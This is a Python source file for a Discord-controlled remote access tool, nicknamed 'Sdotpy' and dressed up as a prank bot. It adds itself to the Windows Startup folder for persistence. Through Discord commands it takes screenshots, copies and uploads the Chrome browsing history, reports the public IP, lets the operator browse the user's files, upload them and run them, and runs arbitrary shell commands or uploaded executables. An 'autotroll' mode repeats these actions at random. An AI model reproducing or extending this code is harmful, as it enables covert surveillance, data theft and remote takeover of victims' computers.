import sys
import os
import ctypes
import platform
import winshell
from win32com.client import Dispatch

def isriskyboi(): #Get risky/check if the person if dumb
    if platform.system() == "Windows":  #open using os' image opening application
        try:
            return ctypes.windll.shell32.IsUserAnAdmin()
        except:
            return False
    else:
        return os.geteuid() == 0

if isriskyboi(): #Check riskyness
    risky = True
else:   
    risky = False
        
print(f"{risky}")

#Get identifcation for direct commands
try:
    user = os.getlogin()
except OSError:
    # Handle the case where os.getlogin() doesn't work
    user = os.environ.get('USERNAME') or os.environ.get('USER') or 'unknown'
strid = user

#Get the startup folder path
startup_folder = os.path.join(os.getenv('APPDATA'), 'Microsoft', 'Windows', 'Start Menu', 'Programs', 'Startup')

#Path to the current executable (after being converted to .exe)
exe_path = sys.argv[0]

#Path for the shortcut file
shortcut_path = os.path.join(startup_folder, 'Sdotpy.lnk')

if risky == True: # If the person likes to be risky
    if not os.path.exists(shortcut_path):# Create the shortcut if it doesn't exist
        shell = Dispatch('WScript.Shell')
        shortcut = shell.CreateShortCut(shortcut_path)
        shortcut.Targetpath = exe_path
        shortcut.WorkingDirectory = os.path.dirname(exe_path)
        shortcut.IconLocation = exe_path  # You can set a custom icon here
        shortcut.save()
        print(f"Shortcut created at {shortcut_path}")
    else:
        print(f"Shortcut already exists at {shortcut_path}")

import json
from cryptography.fernet import Fernet
import discord
from discord.ext import commands 
import time
import subprocess
import webbrowser
import pyautogui
import tkinter as tk
from tkinter import messagebox, Toplevel
import pygetwindow as gw
from playsound3 import playsound
import sqlite3
import requests
import random
import asyncio
from PIL import Image, ImageTk
import threading
from pathlib import Path
import shutil

#Channel ids
Token = "" #Bot token goes here
runchnid = 1293747961762939042 #Insert running channel which is soly to add startup messages in different channel
cmdchnid = 1293748061851357195 #Insert command channel id were you should commands and messages will show
spmchnid = 1293748112703230103 #Were target "all" and automatic messages with show + annoying stuff

#Variables and stuff
ITEMS_PER_PAGE = 15  #Browse # of buttons 
SPI_SETDESKWALLPAPER = 20
SPIF_UPDATEINIFILE = 0x01
SPIF_SENDCHANGE = 0x02

autovar = False

debugvalue = False

#lists
image_paths = []

groupr = []

#dictions
photo_images = {}

#directory variables
script_dir = os.path.dirname(os.path.abspath(__file__))

scrdir = os.path.join(script_dir, 'Screenshot.png')

history_path = os.path.expanduser('~') + '/Library/Application Support/Google/Chrome/Default/History'

hisout = 'history.txt'

hos = "hiscopy"

hoscopy = os.path.join(script_dir, hos)

historyoutput = os.path.join(script_dir, hisout)

app_data = os.getenv('LOCALAPPDATA')

#Bot Intents
intents = discord.Intents.all() #To lazy to do each one
bot = commands.Bot(command_prefix="!", intents = discord.Intents.all())

#All defined classes
class ImagePopup:
    def __init__(self, image_path):
        self.image_path = image_path
        
        self.root = Toplevel()
        self.root.title(image_path)
        self.root.overrideredirect(True)  # Create a borderless window
        self.root.attributes("-topmost", True)

        img = Image.open(self.image_path)

        screen_width = self.root.winfo_screenwidth()
        screen_height = self.root.winfo_screenheight()

        imgsource = max(img.width, img.height) / min(screen_width, screen_height)
        img_targetsize = random.uniform(0.3, 0.7)  # Use a float range for more variability
        resize_factor = img_targetsize / imgsource
        img = img.resize((int(img.width * resize_factor), int(img.height * resize_factor)))

        self.img_tk = ImageTk.PhotoImage(img)
        photo_images[self.image_path] = self.img_tk

        self.label = tk.Label(self.root, image=self.img_tk)
        self.label.pack()

        # Calculate window position
        window_width = img.width
        window_height = img.height

        randX = random.randint(0, screen_width - window_width)
        randY = random.randint(0, screen_height - window_height)

        # Set window position
        self.root.geometry(f'{window_width}x{window_height}+{randX}+{randY}')

        # Close window on click
        self.label.bind("<Button-1>", self.close)
        self.root.protocol("WM_DELETE_WINDOW", self.close)  # Handle close event

    def close(self, event=None):
        self.root.destroy()
  
class FolderView(discord.ui.View):
    def __init__(self, current_path: Path, is_file_view=False, page=0, parent=None):
        super().__init__()
        self.current_path = current_path
        self.is_file_view = is_file_view
        self.page = page
        self.parent = parent
        self.update_buttons()

    def update_buttons(self):
        self.clear_items()
        items = self.get_items()
        start_idx = self.page * ITEMS_PER_PAGE
        end_idx = start_idx + ITEMS_PER_PAGE
        for item in items[start_idx:end_idx]:
            itemdir = item
            itmnm = item.name
            if len(item.name) > 80:
                itmnm = itmnm[:60] + "..."
            button = discord.ui.Button(label=itmnm, style=discord.ButtonStyle.primary)
            if itemdir.is_dir():
                button.callback = self.make_folder_callback(item)
            else:
                button.callback = self.make_file_callback(item)
            self.add_item(button)

        # "Show Files" button to switch between folder and file views
        if not self.is_file_view:
            show_files_button = discord.ui.Button(label="Show Files", style=discord.ButtonStyle.success)
            show_files_button.callback = self.show_files
            self.add_item(show_files_button)

        # Pagination buttons
        if self.page > 0:
            prev_button = discord.ui.Button(label="Previous", style=discord.ButtonStyle.secondary)
            prev_button.callback = self.previous_page
            self.add_item(prev_button)

        if end_idx < len(items):
            next_button = discord.ui.Button(label="Next", style=discord.ButtonStyle.secondary)
            next_button.callback = self.next_page
            self.add_item(next_button)

        # "Go Back" button
        if self.parent:
            back_button = discord.ui.Button(label="Back", style=discord.ButtonStyle.danger)
            back_button.callback = self.go_back
            self.add_item(back_button)

    def get_items(self):
        # Get folders or files depending on view mode
        if self.is_file_view:
            return [item for item in self.current_path.iterdir() if item.is_file()]
        else:
            return [item for item in self.current_path.iterdir() if item.is_dir()]

    async def previous_page(self, interaction: discord.Interaction):
        self.page -= 1
        self.update_buttons()
        await interaction.response.edit_message(view=self)

    async def next_page(self, interaction: discord.Interaction):
        self.page += 1
        self.update_buttons()
        await interaction.response.edit_message(view=self)

    async def go_back(self, interaction: discord.Interaction):
        # Go back to the parent view (previous folder)
        await interaction.response.edit_message(view=self.parent)

    async def show_files(self, interaction: discord.Interaction):
        # Switch to file view in the current folder
        print("potato")
        view = FolderView(self.current_path, is_file_view=True, parent=self)
        await interaction.response.edit_message(view=view)

    def make_folder_callback(self, folder: Path):
        async def callback(interaction: discord.Interaction):
            # Show the contents of the selected folder
            view = FolderView(folder, parent=self)
            await interaction.response.edit_message(view=view)
        return callback

    def make_file_callback(self, file: Path):
        async def callback(interaction: discord.Interaction):
            # Show options to either send the file or go back
            view = FileOptionsView(file, parent=self)
            size = os.path.getsize(file)
            # Show options to either send the file or go back
            def convert_bytes(size):
                for unit in ['bytes', 'KB', 'MB', 'GB', 'TB']:
                    if size < 1024:
                        return f"{size:.2f} {unit}"
                    size /= 1024
            potato = convert_bytes(size)
            # When the interaction starts, update the message with the file name and the buttons
            # await interaction.response.send_message(content=f"{potato}", view=view)
            await interaction.response.edit_message(content=f"{potato}", view=view)
        return callback

# Custom View for file actions (send or go back)
class FileOptionsView(discord.ui.View):
    def __init__(self, file: Path, parent=None):
        super().__init__()
        self.file = file
        self.parent = parent
        self.add_buttons()

    def add_buttons(self):
        # Button to send the file to Discord 
        runbutton = discord.ui.Button(label="Run File", style=discord.ButtonStyle.primary)
        runbutton.callback = self.runfile
        self.add_item(runbutton)

        send_button = discord.ui.Button(label="Send File", style=discord.ButtonStyle.secondary)
        send_button.callback = self.send_file
        self.add_item(send_button)

        # Button to go back to the previous folder view
        back_button = discord.ui.Button(label="Back", style=discord.ButtonStyle.danger)
        back_button.callback = self.go_back
        self.add_item(back_button)
    
    async def runfile(self, interaction: discord.Interaction):
        # Go back to the parent folder view
        def browserun():
            subprocess.run([self.file])
        try:
            brt = threading.Thread(target=browserun)
            brt.start()
            await interaction.response.send_message("Running")
        except:
            await interaction.channel.send("Failed")
        
        
    async def send_file(self, interaction: discord.Interaction):
        # Send the selected file to the channel, if file is large discord will this it's an error but its fine, will fix later 
        with open(self.file, 'rb') as file_data:
            try:
                await interaction.channel.send(file=discord.File(file_data, filename=self.file.name))
            except:
                await interaction.channel.send("Error: file to large or issue sending")  #don't know why it wouldn't say error fix later

        await interaction.response.send_message("Sent")

    async def go_back(self, interaction: discord.Interaction):
        # Go back to the parent folder view
        await interaction.response.edit_message(view=self.parent)

#All defined functions
def writefunct(text):
    if text != None:
            print(text)    
    else:
        text = "Crazy? I was crazy once. They put me in a room. A rubber room. A rubber room with rats. They put me in a rubber room with rubber rats. Rubber rats? I hate rubber rats. They make me crazy."  #Replace with desired text,
    
    if platform.system() == "Windows":  #open using os' image opening application
        subprocess.Popen("C:\\Windows\\System32\\notepad.exe")
        time.sleep(2)
        windows = gw.getWindowsWithTitle("Untitled - Notepad")
        if windows:
            notepad = windows[0]
            notepad.activate()  # Bring Notepad to the foreground
            pyautogui.write(f"{text}", interval=0.05)  #pyauotgui kinda sucks so if text gets skiped im not fixing it
            return
        else:
            returnvar = 2
            return returnvar

    elif platform.system() == "Darwin": #Apple/Mac support added when i can test
        print(0)
        return

    else: #linux the best one that I can't test
        print(0)
        return
 
def urlfunct(url): #self explanitory
    webbrowser.open(url)

def promptbox(name, text):
    if name == strid:
        messagebox.showinfo("Special Important message", f"{text}")
    else:
        messagebox.showinfo("Important message", f"{text}")

def promptfunct(name, text):
    if text == None:
        text = "Regularly scheduled Jumpscare"
    brt = threading.Thread(target=promptbox, args=(name, text))
    brt.start()


def wallfunct(imagepth):          #make function work on all os later
    if not os.path.isfile(imagepth):
        print(f"File not found: {imagepth}")
        return
    
    absimagepath = os.path.abspath(imagepth)
    print(absimagepath)
    if risky == True:
        ctypes.windll.user32.SystemParametersInfoW(SPI_SETDESKWALLPAPER, 0, absimagepath, SPIF_UPDATEINIFILE | SPIF_SENDCHANGE)
        imvar = f"Wallpaper changed: {strid}, Permenant"                           
    else:
        ctypes.windll.user32.SystemParametersInfoW(SPI_SETDESKWALLPAPER, 0, absimagepath, SPIF_SENDCHANGE)
        imvar = f"Wallpaper changed: {strid}"
    return imvar
    
def historyfunct():
    if app_data:
    #Construct the path to the Chrome history file
        history_path = os.path.join(app_data, 'Google', 'Chrome', 'User Data', 'Default', 'History')

    if not os.path.exists(historyoutput):
        with open(historyoutput, 'w') as file:
            file.write("History\n")

    #Connect to the database
    shutil.copy(history_path, hoscopy)
    
    conn = sqlite3.connect(hoscopy)
    cursor = conn.cursor()

    #Query to get the browsing history
    query = "SELECT url, title, visit_count FROM urls ORDER BY last_visit_time DESC LIMIT 50"
    cursor.execute(query)

    #Fetch and format the results
    results = cursor.fetchall()

    with open(historyoutput, 'w', encoding='utf-8') as file:
        file.write(f"--- History Dump at {time.strftime('%Y-%m-%d %H:%M:%S')} ---\n")
        for row in results:
            file.write(f"URL: {row[0]}\nTitle: {row[1]}\nLast Visit Time: {row[2]}\n\n")
        file.write("\n")
    conn.close()
    os.remove(hoscopy)

def openimgfunc(file_path):
    if os.path.exists(file_path):
        print(f'File exists: {file_path}')
    else:
        print(f'File does not exist: {file_path}')

    if platform.system() == "Windows":  #open using os' image opening application
        os.startfile(file_path)
    elif platform.system() == "Darwin":
        subprocess.call(["open", file_path])
    else:
        subprocess.call(["xdg-open", file_path])

def delimgfunc(file_path):
    time.sleep(10)      #wait before delete so image can load even if device is slow

    #Delete the file
    os.remove(file_path)

    time.sleep(5)

    if os.path.exists(file_path): #debug: wait and check if like image is deleted
        print(f'File exists: {file_path}')
    else:
        print(f'File does not exist: {file_path}')

def popimgthreadfunct(image_path):
    # Create a new thread for each image
    thread = threading.Thread(target=lambda: ImagePopup(image_path))
    thread.start()

#Bot Events
@bot.event #When bot connects to server
async def on_ready():
    print("Running")                                    #Debug
    channel = bot.get_channel(runchnid)                    #Get the specifed channel
    await channel.send(f"Operating: {strid}, Admin: {risky}")           #Send message to server
    promptfunct("all", "Sdotpy Running")

#Bot commands.  Example: !test all
@bot.command(name='stop')#To close specified online bots
async def stop(ctx, *, name: str = None):
    if name == strid or name == "all" or name in groupr:   #Send command to only directed bot
        await ctx.send(f"Shuting down: {strid}")
        root = tk.Tk()
        root.quit()
        sys.exit()

@bot.command(name='test')#Test if bot can receive
async def test(ctx, *, name: str = None):
    if name == strid:                           #Sends message "directed test" with id to verify direct receive function works
        await ctx.send(f'Directed test: {strid}, Ver 3.3, Admin: {risky}, Debug: {debugvalue}')
    elif name == "all":                         #Sends message "all test" with id to verify receive all function works
        await ctx.send(f'All test: {strid}, Ver 3.3, Admin: {risky}, Debug: {debugvalue}')
    elif name in groupr:
        await ctx.send(f'Group test: {strid}, Ver 3.3, Admin: {risky}, Debug: {debugvalue}')
    else:                                       #Does nothing because target destination is mispelled or not the directed bot
        print("0")

@bot.command(name='debug')#Enables/disables sends debug messages to confirm the command was processed
async def debug(ctx, name: str = None, *, debugrep: str = 'O'):
    global debugvalue
    if name == strid or name == "all" or name in groupr:
        if debugrep.lower() in 'true':           
            debugvalue = True
            await ctx.send(f'Debuging set to {debugvalue}: {strid}')
        elif debugrep.lower() in 'false':
            debugvalue = False
            await ctx.send(f'Debuging set to {debugvalue}: {strid}')
        else:
            debugvalue = not debugvalue
            await ctx.send(f'Debuging set to {debugvalue}: {strid}')

@bot.command(name='group')#Grouping function usefull for multiple people/groups
async def group(ctx, name: str = None, *, groupnm: str = None):
    global groupr
    if name == strid or name == "all" or name in groupr:
        if groupnm != None:
            if groupnm not in groupr:         
                groupr.append(groupnm)
                if debugvalue == True:
                    await ctx.send(f'Added {strid} to: {groupnm}')
            else:
                groupr.remove(groupnm)
                if debugvalue == True:
                    await ctx.send(f'Removed {strid} from: {groupnm}')
        else:
            await ctx.send(f'Specify a group name')
    else:
        print(0)

@bot.command(name='listgroup')#Grouping function usefull for multiple people/groups
async def listgroup(ctx, name: str = None, *, groupnm: str = None):
    global groupr
    if name == strid or name == "all" or name in groupr:
        grplst = ', '.join(groupr)
        await ctx.send(f'List groups {strid}: {grplst}')    

@bot.command(name='screen')
async def screen(ctx, *, name: str = None):
    if name == strid or name == "all" or name in groupr:                  #Send to only specified id
        pyautogui.screenshot(scrdir) #take screenshot
        await ctx.send(content=f"Screen:{strid}", file=discord.File(scrdir)) #send screenshot
        try:
            # Delete the file
            os.remove(scrdir)
        except Exception as e:
                print("ohno") 

@bot.command(name='write')#Check function for details
async def write(ctx, name: str = None, *, text: str = None):
    if name == strid or name == "all" or name in groupr:
        returnvar = writefunct(text)
        if returnvar == 2:
            await ctx.send("Error")
        else:
            if debugvalue == True:
                await ctx.send(f"Write:{strid}")

@bot.command(name='rick')#Check function for details
async def rick(ctx, *, name: str = None):
    if name == strid or name == "all" or name in groupr:
        url = 'https://www.youtube.com/watch?v=p7YXXieghto'
        urlfunct(url)
        if debugvalue == True:
            await ctx.send(f'Rickrolled: {strid}')

@bot.command(name='altrick')#Check function for details
async def altrick(ctx, *, name: str = None):
    if name == strid or name == "all" or name in groupr:
        url = 'https://youtube.com/clip/Ugkx6oaIXZKt-QhGWyxiwjIUQdK--u3zN-JE?si=FGFWE2OV0m9utxLc'
        urlfunct(url)
        if debugvalue == True:
            await ctx.send(f'Animated rickrolled: {strid}')

@bot.command(name='url')#Check function for details
async def url(ctx, name: str = None, *, text: str = None):
    if name == strid or name == "all" or name in groupr:
        url = f'{text}'
        urlfunct(url)
        if debugvalue == True:
            await ctx.send(f'Url opened: {strid}')

@bot.command(name='openimg')
async def openimg(ctx, *, name: str = None):
    if name == strid or name == "all" or name in groupr:
        if ctx.message.attachments:
            attachment = ctx.message.attachments[0]  # Get the first attachment
            file_name = attachment.filename  # Get the name of the file

            # Download the file
            try:
                file_path = os.path.join('.', file_name) 
                await attachment.save(file_path)
                # To optionally send the file back to the channel use this :await ctx.send(file=discord.File(file_path))
                openimgfunc(file_path)
                if debugvalue == True:
                    await ctx.send(f'Opened Img: {strid}')
                delimgfunc(file_path)

            except Exception as e:
                await ctx.send(f'Failed command: {e}')
        else:
            await ctx.send('No file attached')

@bot.command(name='prompt')#Check function for details
async def prompt(ctx, name: str = None, *, text: str = None):
    if name == strid or name == "all" or name in groupr:
        if debugvalue == True:
            await ctx.send(f"Prompt Sent:{strid}")
        promptfunct(name, text)
        if debugvalue == True:
            await ctx.send(f'Prompt Clicked: {strid}')

@bot.command(name='wallpaper')#Check function for details
async def wallpaper(ctx, *, name: str = None): 
    if name == strid or name == "all" or name in groupr:
        if ctx.message.attachments:
            attachment = ctx.message.attachments[0]  # Get the first attachment
            imgpth = attachment.filename  # Get the name of the file
            try:
                file_path = os.path.join('.', imgpth) 
                await attachment.save(file_path)
                print(file_path)
            except:
                await ctx.send(f'Failed to download the file')
            try:
                imvar = wallfunct(file_path)
                if debugvalue == True:
                    await ctx.send(imvar)
            except:
                await ctx.send(f'Failed to make wallpaper')     
        else:
            await ctx.send('No file atached')

@bot.command(name='audio')#Check function for details
async def audio(ctx, *, name: str = None):
    if name == strid or name == "all" or name in groupr:    
        if ctx.message.attachments:
            attachment = ctx.message.attachments[0]  # Get the first attachment
            audpth = attachment.filename  # Get the name of the file
            print(audpth)
            audie = os.path.join('.', audpth)
            await attachment.save(audie)
            print("Playing")
            if debugvalue == True:
                await ctx.send(f'Audio Playing: {strid}')
            await asyncio.playsound(audie)              #Make it so that the audio function doesn't block the main thread
            os.remove(audie)                            #That is if its broken never tested
        else:
            await ctx.send('No file atached')   

@bot.command(name='popimg')
async def popimg(ctx, *, name: str = None):
    if name == strid or name == "all" or name in groupr:
        if ctx.message.attachments:
            for attachment in ctx.message.attachments:
                file_path = os.path.join(script_dir, attachment.filename)
                await attachment.save(file_path)
                image_paths.append(file_path)
                print(file_path)
            if debugvalue == True:
                await ctx.send(f'Popping up: {strid}')
            for path in image_paths:
                popimgthreadfunct(path)
            await asyncio.sleep(10)
            for path in image_paths:
                os.remove(path)
            image_paths.clear()
        else:
            await ctx.send('Attach images')

#Slightly risky for the biscui
@bot.command(name='history')
async def history(ctx, *, name: str = None):
    if name == strid or name == "all" or name in groupr:
        historyfunct()                           
        await ctx.send(content=f'💀History💀:{strid}', file=discord.File(historyoutput))
        os.remove(historyoutput)
        if risky == False:
            promptfunct(strid, "Search History Sent")

@bot.command(name='grabip')
async def grabip(ctx, *, name: str = None):
    if name == strid or name == "all" or name in groupr:     
        response = requests.get('https://api.ipify.org?format=json')
        publicip = response.json()['ip']
        await ctx.send(f'💀dirgrabip💀{name}:{publicip}')
        if risky == False: 
            promptfunct(strid, "Public IP Sent")

#Very danger either could messup(fuck is a better term) your pc or REQUIRES to run admin
@bot.command(name='cmd') #testing
async def cmd(ctx, name: str = None, *, cmd: str = None):
    if risky == True:     
        if name == strid or name == "all" or name in groupr: 
            await ctx.send(f"Sending cmd: {name}")
            if ctx.message.attachments:
                attachment = ctx.message.attachments[0]  # Get the first attachment
                file_name = attachment.filename  # Get the name of the file
                try:
                    file_path = os.path.join('.', file_name) 
                    await attachment.save(file_path)
                    await subprocess.run([file_path])
                    os.remove(file_path)
                except:
                    await ctx.send('Error handleing script')
            else:
                try:
                    coman = subprocess.Popen(cmd, shell = True, stdout=subprocess.PIPE, stderr=subprocess.PIPE) 
                    print(coman)
                except:
                    await ctx.send(f'Error sending command')

#Complicated commands
@bot.command(name='browse') #will probably make this a slightly risky file + i will add more later :O
async def browse(ctx, *, name: str = None):
    if name == strid or name in groupr: #only supports directed or group browse to prevent rate limiting
        user_folder = Path.home()  # Start at the user's home directory
        view = FolderView(user_folder)  # Initialize the FolderView with the home directory
        await ctx.send("Click a folder to navigate or show files:", view=view)

#CONSTANT WORK IN PROGRESS (ill definatly finish this)
functions = [lambda smpchnid, name="all": rick(smpchnid, name=name),
             lambda smpchnid, name="all": grabip(smpchnid, name=name),
             lambda smpchnid, name="all": history(smpchnid, name=name),
             lambda smpchnid, name="all": altrick(smpchnid, name=name),
             lambda smpchnid, name="all": screen(smpchnid, name=name)]            

@bot.command(name='autoswap')
async def autoswap(ctx, name: str = None, *, autov: str = "true"):
    global autovar
    if name == strid or name == "all" or name in groupr:
        if autov.lower() in 'true':           
            autovar = True
            await ctx.send(f'Auto set to {autovar}: {strid}')
        elif autov.lower() in 'false':
            autovar = False
            await ctx.send(f'Auto set to {autovar}: {strid}')
        else:
            autovar = not autovar
            await ctx.send(f'Auto set to {autovar}: {strid}')

@bot.command(name='autotroll')
async def autotroll(ctx, *, name: str = None):
    global autovar
    if autovar == True:
        if name == strid or name == "all" or name in groupr:
            await ctx.send('Autotroll Enabled')                       
            while autovar == True:  
                autof = random.choice(functions)
                print(autof)
                await autof(ctx)
                await asyncio.sleep(150)
    else:
        await ctx.send('Use autoswap and enter "true"')

@bot.command(name='extra')
async def extra(ctx, *, name: str = None):
    if name == strid or name == "all" or name in groupr:
        print("0")

# Function to run the bot
def run_bot():
    bot.run(Token)  # Replace with your bot token

# Start the bot in a separate thread
def start_bot_thread():
    bot_thread = threading.Thread(target=run_bot)
    bot_thread.start()

# Main function
def main():
    start_bot_thread()  # Start the Discord bot thread

    # Run Tkinter main loop in the main thread
    root = tk.Tk()
    root.withdraw()  # Hide the Tkinter main window
    root.mainloop()

if __name__ == '__main__':
    main()
